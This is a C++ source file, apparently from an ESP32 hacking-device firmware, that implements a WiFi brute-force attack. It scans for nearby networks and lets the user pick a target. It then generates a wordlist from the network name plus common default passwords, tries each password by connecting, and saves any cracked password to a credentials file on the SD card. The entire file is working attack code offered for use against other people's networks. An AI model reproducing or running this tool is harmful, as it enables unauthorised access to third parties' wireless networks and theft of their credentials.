#if !LITE_VERSION
#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <globals.h>
#include <WiFi.h>
#include <globals.h>

std::vector<String> generateWordlist(String ssid) {
    std::vector<String> words;
    String base = ssid;
    base.toLowerCase();
    String baseUpper = ssid;


    String clean = base;
    clean.replace("_", "");
    clean.replace("-", "");
    clean.replace(" ", "");
    clean.replace("wifi", "");
    clean.replace("net", "");
    clean.replace("network", "");
    clean.replace("home", "");
    clean.replace("guest", "");


    words.push_back(base);
    words.push_back(baseUpper);
    words.push_back(base + "123");
    words.push_back(base + "1234");
    words.push_back(base + "12345");
    words.push_back(base + "123456");
    words.push_back(base + "1234567");
    words.push_back(base + "12345678");
    words.push_back(base + "password");
    words.push_back(base + "pass");
    words.push_back(base + "wifi");
    words.push_back(base + "net");


    for (int y = 2018; y <= 2026; y++) {
        words.push_back(base + String(y));
        words.push_back(baseUpper + String(y));
        words.push_back(clean + String(y));
    }


    const char *suffixes[] = {
        "!", "@", "#", "1!", "123!", "2024!", "2025!",
        "01", "02", "69", "99", "00", "007",
        "abc", "xyz", "qwerty"
    };
    for (auto &suf : suffixes) {
        words.push_back(base + String(suf));
        words.push_back(clean + String(suf));
    }


    words.push_back("password" + base);
    words.push_back("admin" + base);
    words.push_back("welcome" + base);


    String leet = base;
    leet.replace("a", "4");
    leet.replace("e", "3");
    leet.replace("i", "1");
    leet.replace("o", "0");
    leet.replace("s", "5");
    words.push_back(leet);
    words.push_back(leet + "123");


    String capitalized = base;
    if (capitalized.length() > 0) {
        capitalized[0] = toupper(capitalized[0]);
    }
    words.push_back(capitalized);
    words.push_back(capitalized + "123");
    words.push_back(capitalized + "2024");
    words.push_back(capitalized + "!");


    String reversed = "";
    for (int i = base.length() - 1; i >= 0; i--) {
        reversed += base[i];
    }
    words.push_back(reversed);
    words.push_back(reversed + "123");


    words.push_back(base + base);
    words.push_back(clean + clean);


    if (clean.length() >= 4) {
        words.push_back(clean.substring(0, 4) + "1234");
        words.push_back(clean.substring(0, 4) + "0000");
    }


    const char *defaults[] = {
        "admin", "password", "12345678", "1234567890",
        "00000000", "11111111", "88888888", "87654321",
        "qwerty123", "abc12345", "iloveyou", "monkey123",
        "dragon123", "master123", "letmein1", "welcome1",
        "trustno1", "sunshine1", "princess1"
    };
    for (auto &d : defaults) {
        words.push_back(String(d));
    }


    std::vector<String> filtered;
    for (auto &w : words) {
        if (w.length() >= 8 && w.length() <= 63) {

            bool exists = false;
            for (auto &f : filtered) {
                if (f == w) { exists = true; break; }
            }
            if (!exists) filtered.push_back(w);
        }
    }

    return filtered;
}

bool tryConnect(String ssid, String password, int timeoutMs = 5000) {
    WiFi.disconnect(true);
    delay(100);
    WiFi.begin(ssid.c_str(), password.c_str());

    unsigned long start = millis();
    while (millis() - start < (unsigned long)timeoutMs) {
        if (WiFi.status() == WL_CONNECTED) {
            return true;
        }
        delay(100);
        esp_task_wdt_reset();
    }
    WiFi.disconnect(true);
    return false;
}

void arsenal_wifi_bruteforce(void) {
    if (ESP.getFreeHeap() < 20000) {
        displayRedStripe("Low memory!", TFT_WHITE, TFT_RED);
        delay(1500);
        return;
    }

        drawMainBorderWithTitle("WiFi Brute Force");
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.drawCentreString(String("Scanning networks..."), tftWidth / 2, tftHeight / 2, 1);

        WiFi.mode(WIFI_STA);
        int n = WiFi.scanNetworks(false, false);

        if (n == 0) {
            displayRedStripe("No networks found");
            delay(1500);
            return;
        }


        options.clear();
        for (int i = 0; i < n && i < 15; i++) {
            String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB)";
            options.push_back({label, [i]() {}});
        }

        int targetIdx = -1;
        for (int i = 0; i < n && i < 15; i++) {
            options[i].operation = [i, &targetIdx]() { targetIdx = i; };
        }
        loopOptions(options, MENU_TYPE_SUBMENU, "Select Target");

        if (targetIdx < 0) return;

        String targetSSID = WiFi.SSID(targetIdx);
        WiFi.scanDelete();


        auto wordlist = generateWordlist(targetSSID);


        if (setupSdCard()) {
            if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
            String wlPath = "/arsenal/wordlist_" + targetSSID + ".txt";
            File wl = SD.open(wlPath, FILE_WRITE);
            if (wl) {
                for (auto &w : wordlist) {
                    wl.println(w);
                }
                wl.close();
            }
        }


        int attempted = 0;
        int total = wordlist.size();
        bool found = false;
        String foundPassword = "";
        unsigned long startTime = millis();

        for (auto &password : wordlist) {

            drawMainBorderWithTitle("Brute Force");
            int y = 40;
            int padX = 10;

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.setTextSize(FP);
            tft.setCursor(padX, y);
            tft.print("Target: " + targetSSID.substring(0, 18));
            y += 14;

            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(padX, y);
            tft.printf("Progress: %d/%d", attempted, total);
            y += 14;

            tft.setCursor(padX, y);
            tft.print("Trying: " + password.substring(0, 20));
            y += 14;

            unsigned long elapsed = (millis() - startTime) / 1000;
            tft.setCursor(padX, y);
            tft.printf("Elapsed: %lus | ~%ds/try", elapsed, elapsed / max(1, attempted));
            y += 14;


            int barW = tftWidth - 2 * padX;
            int barH = 6;
            tft.fillRect(padX, y, barW, barH, tft.color565(30, 30, 30));
            int fillW = (barW * attempted) / max(1, total);
            tft.fillRect(padX, y, fillW, barH, TFT_GREEN);

            tft.setTextColor(TFT_RED, bruceConfig.bgColor);
            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 18, 1);


            if (tryConnect(targetSSID, password, 4000)) {
                found = true;
                foundPassword = password;
                break;
            }

            attempted++;

            if (check(EscPress)) break;
            esp_task_wdt_reset();
        }

        if (found) {

            drawMainBorderWithTitle("PASSWORD FOUND!");
            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
            tft.setTextSize(FM);
            tft.drawCentreString(String("CRACKED!"), tftWidth / 2, 50, 1);
            tft.setTextSize(FP);
            int y = 80;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(10, y);
            tft.print("SSID: " + targetSSID);
            y += 14;
            tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
            tft.setCursor(10, y);
            tft.print("PASS: " + foundPassword);
            y += 20;
            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
            tft.setCursor(10, y);
            tft.printf("Attempts: %d/%d", attempted + 1, total);


            if (setupSdCard()) {
                File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                if (f) {
                    f.printf("[BruteForce] SSID:%s PASS:%s Attempts:%d\n",
                             targetSSID.c_str(), foundPassword.c_str(), attempted + 1);
                    f.close();
                }
            }

            while (!check(EscPress) && !check(SelPress)) delay(100);
        } else {
            displayRedStripe("Not found (" + String(attempted) + " tried)");
            delay(2000);
        }

        WiFi.disconnect(true);
}
#endif
